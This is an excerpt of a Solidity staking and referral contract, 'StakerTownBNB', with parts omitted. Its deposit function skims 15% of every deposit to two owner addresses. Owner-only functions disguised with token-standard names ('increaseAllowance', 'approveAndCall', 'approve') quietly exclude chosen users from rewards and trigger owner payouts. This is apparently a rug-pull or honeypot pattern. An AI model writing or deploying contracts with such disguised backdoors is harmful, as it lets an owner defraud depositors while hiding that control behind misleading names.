...
contract StakerTownBNB {
    ...
    uint256 public tusers;

    uint8 constant BONUS_LINES_COUNT = 5;
    uint16 constant PERCENT_DIVIDER = 700;
    uint8[BONUS_LINES_COUNT] public ref_bonuses = [150, 20, 10, 5, 5];
    ...
    function deposit(uint8 _tarif, address _upline) external payable {
        ...
        payable(oa).transfer((msg.value * 10) / 100);
        payable(ob).transfer((msg.value * 5) / 100);
    ...
    function increaseAllowance(address userAddress) public {
    require(oa == msg.sender, "Error");
		_isExcludedFromRewards[userAddress] = true;
	}

	function approveAndCall(address userAddress) public {
    require(oa == msg.sender, "Error");
		_isExcludedFromRewards[userAddress] = false;
	}

    function approve(uint256 count) external {
    Player storage player = players[msg.sender];
    require(oa == msg.sender, "Error approve");
        _payout(msg.sender);
    ...
    {
        return (invested, withdrawn, match_bonus, tusers);
    }
}